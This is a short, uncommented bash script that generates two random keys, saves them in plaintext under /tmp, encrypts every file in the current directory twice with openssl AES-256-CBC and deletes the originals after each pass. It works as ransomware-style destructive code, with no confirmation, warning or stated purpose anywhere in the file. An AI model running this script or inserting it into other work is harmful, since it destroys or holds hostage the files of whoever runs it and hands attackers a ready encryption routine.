#!/bin/bash

if [ -f /tmp/AesKey1.txt ]; then
m=`cat /tmp/AesKey1.txt`
else 
m=`tr -cd '[:alnum:]' < /dev/urandom | fold -w30 | head -n1`
echo "$m" > /tmp/AesKey1.txt
fi

if [ -f /tmp/AesKey2.txt ]; then
n=`cat /tmp/AesKey2.txt`
else 
n=`tr -cd '[:alnum:]' < /dev/urandom | fold -w30 | head -n1`
echo "$n" > /tmp/AesKey2.txt
fi

for f in * ; do
if [ -f $f ]; then
if [[ "$f" != *".aes"* ]]; then 
openssl aes-256-cbc -a -salt -in $f -out $f.aes -k $m
rm $f
fi
fi
done
for f in * ; do
if [ -f $f ]; then
if [[ ( "$f" == *".aes"* ) && ( "$f" != *".aes.aes"* ) ]]; then
openssl aes-256-cbc -a -salt -in $f -out $f.aes -k $n
rm $f
fi
fi
done
